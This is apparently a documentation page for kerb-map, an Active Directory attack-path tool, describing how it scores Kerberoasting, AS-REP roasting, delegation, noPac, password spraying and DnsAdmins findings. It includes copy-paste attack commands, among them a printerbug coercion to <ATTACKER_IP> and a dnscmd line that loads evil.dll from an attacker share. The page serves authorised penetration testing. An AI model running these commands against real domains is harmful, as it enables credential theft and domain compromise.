# Scoring Engine

> The scoring engine is what separates kerb-map from a raw enumeration tool. After all modules complete, it cross-correlates every finding into a single unified ranked attack path list — telling you exactly what to hit first and the exact command to run.

---

## Overview

Without a scoring engine, running kerb-map gives you data:

```
Kerberoastable: svc_sql, svc_web, svc_backup, svc_iis, svc_monitor
AS-REP Roastable: helpdesk01, temp_user
Unconstrained Delegation: WEBSERVER01, APPSERVER03
CVE: noPac (MachineAccountQuota=10)
Password policy: no lockout
DnsAdmins: svc_dns
```

With the scoring engine, the same data becomes an actionable priority list:

```
#1  Domain Controller  noPac (CVE-2021-42278)     CRITICAL  98  → python noPac.py ...
#2  WEBSERVER01$       Unconstrained Delegation   CRITICAL  95  → printerbug.py ...
#3  All Domain Users   Password Spray (no lockout) CRITICAL  85  → nxc smb ...
#4  svc_dns            DnsAdmins → SYSTEM on DC   HIGH      88  → dnscmd ...
#5  svc_sql            Kerberoast                 CRITICAL  85  → GetUserSPNs.py ...
```

---

## How Findings Are Scored

### Kerberoastable Accounts (SPN Scanner)

Each SPN account receives a dynamic score from 0–100 based on four factors:

#### Encryption Type (up to +40 pts)

```
RC4 allowed (enc_types = 0 or bit 0x4 set)  → +40
Unknown / default encryption                 → +20
AES only                                     → +0
```

RC4 hashes crack roughly 10x faster than AES in hashcat. An RC4-enabled account is always prioritised over an AES-only account with the same password age.

**How to tell from output:**
```
RC4  YES  → request with default options, use hashcat -m 13100
RC4  NO   → use -enc-type aes256, hashcat -m 19700 (much slower)
```

#### Password Age (up to +25 pts)

```
Never set                → +15
Older than 730 days      → +25
Older than 365 days      → +15
Older than 180 days      → +5
Less than 180 days       → +0
```

Old passwords are more likely to be weak (set before modern password policies), guessable (seasonal patterns: `Winter2022!`), or unchanged since provisioning.

#### Admin Group Membership (+20 pts)

```
adminCount=1 OR member of Domain Admins / Enterprise Admins / etc.  → +20
```

If cracking this hash gives you direct elevated access, it's worth more effort. An RC4-enabled service account that's a member of Domain Admins scores 40+20 = 60 before password age is even considered.

#### Service Type Bonus (up to +35 pts)

```
MSSQLSvc, exchangeMDB       → +30–35
WSMAN, CIFS                 → +20–25
HTTP, LDAP, TERMSRV         → +15–20
HOST, RPC, DNS              → +5–15
```

High-value service types (SQL, Exchange) indicate accounts with more privileges and often weaker password hygiene.

#### Never Logged In (+10 pts)

Accounts that have never been used are often forgotten provisioning artefacts with default or simple passwords.

---

### AS-REP Roastable Accounts

Flat scoring — the attack requires zero credentials so the opportunity cost is always near zero.

```
Standard account                    → 75
Member of privileged group          → 90
```

---

### Delegation Findings

```
Unconstrained delegation            → 95  (always CRITICAL)
Constrained delegation w/ S4U2Self  → 80  (protocol transition = HIGH)
RBCD configured                     → 70  (HIGH)
```

Unconstrained delegation is always the highest-priority delegation finding because it enables full domain compromise via coercion attacks.

---

### CVE Findings

```
CVE severity CRITICAL  → 98
CVE severity HIGH      → 85
CVE severity MEDIUM    → 60
CVE severity LOW       → 30
```

CVE-based findings score above almost everything else because they represent direct, often trivially-exploitable paths to Domain Admin.

---

### Policy Findings

```
No account lockout (lockoutThreshold=0)  → 85  (Password Spray — CRITICAL)
```

No lockout means unlimited password spraying. kerb-map adds this directly to the priority list as an attack path targeting all domain users.

---

### DnsAdmins Members

```
Any DnsAdmins member  → 88  (HIGH)
```

DnsAdmins → SYSTEM on any DC via DLL injection into the DNS service. Consistently underestimated.

---

### Trust Findings

```
Domain trust with SID filtering disabled  → 75  (HIGH)
```

SID filtering disabled means an attacker with DA in one domain can inject SID history to access resources in the trusted domain.

---

## Full Score Reference Table

| Finding | Score | Severity | Condition |
|---|---|---|---|
| CVE — CRITICAL severity | 98 | CRITICAL | Any CRITICAL CVE detected |
| Unconstrained Delegation | 95 | CRITICAL | Always |
| Password Spray (no lockout) | 85 | CRITICAL | lockoutThreshold = 0 |
| DnsAdmins member | 88 | HIGH | Any member found |
| CVE — HIGH severity | 85 | HIGH | Any HIGH CVE detected |
| AS-REP + admin group | 90 | CRITICAL | Pre-auth off + admin member |
| AS-REP standard | 75 | HIGH | Pre-auth off |
| Kerberoast (RC4, admin, old pwd) | up to 100 | CRITICAL | Score ≥ 80 |
| Kerberoast (RC4 only) | 40–60 | HIGH/MEDIUM | Score 40–79 |
| Constrained Deleg w/ S4U2Self | 80 | HIGH | Protocol transition enabled |
| Trust abuse (SID filter off) | 75 | HIGH | SID filtering disabled |
| RBCD | 70 | HIGH | Attribute present |
| CVE — MEDIUM severity | 60 | MEDIUM | |
| Constrained Deleg (no S4U2Self) | 50 | MEDIUM | No protocol transition |

---

## Next Step Generation

Every entry in the priority table includes a pre-filled command with the actual account names and domain details substituted in. You copy-paste directly into your terminal.

**Examples:**

```bash
# Kerberoast — account name substituted
GetUserSPNs.py corp.local/jsmith:pass -request-user svc_sql -outputfile svc_sql.hash

# noPac — domain and DC IP substituted
python noPac.py corp.local/jsmith:pass -dc-ip 192.168.1.10 -shell

# Unconstrained delegation — discovered hostname substituted
python printerbug.py corp.local/jsmith:pass@WEBSERVER01.corp.local <ATTACKER_IP>

# Password spray — pre-filled with nxc syntax
nxc smb 192.168.1.10 -u users.txt -p passwords.txt --no-bruteforce

# DnsAdmins — account name shown
dnscmd <DC_NAME> /config /serverlevelplugindll \\<ATTACKER_IP>\share\evil.dll
```

---

## Deduplication

Findings are deduplicated by `(target, attack)` key. If multiple modules identify the same issue from different angles — for example the delegation mapper and the CVE scanner both flagging unconstrained delegation — only one entry appears in the output.

---

## Adjusting Top N

By default the priority table shows the top 15 findings. Change this with `--top`:

```bash
# Show top 5 only
kerb-map -d corp.local -dc 192.168.1.10 -u jsmith -p pass --top 5

# Show all findings
kerb-map -d corp.local -dc 192.168.1.10 -u jsmith -p pass --top 100

# Full data is always in JSON regardless of --top
kerb-map -d corp.local -dc 192.168.1.10 -u jsmith -p pass -o json
```

---

## See Also

- [Module Reference](Module-Reference) — per-module scoring detail
- [Output & Reporting](Output-and-Reporting) — how to export the full scored list
- [Flag Reference](Flag-Reference#output) — `--top` and output flags
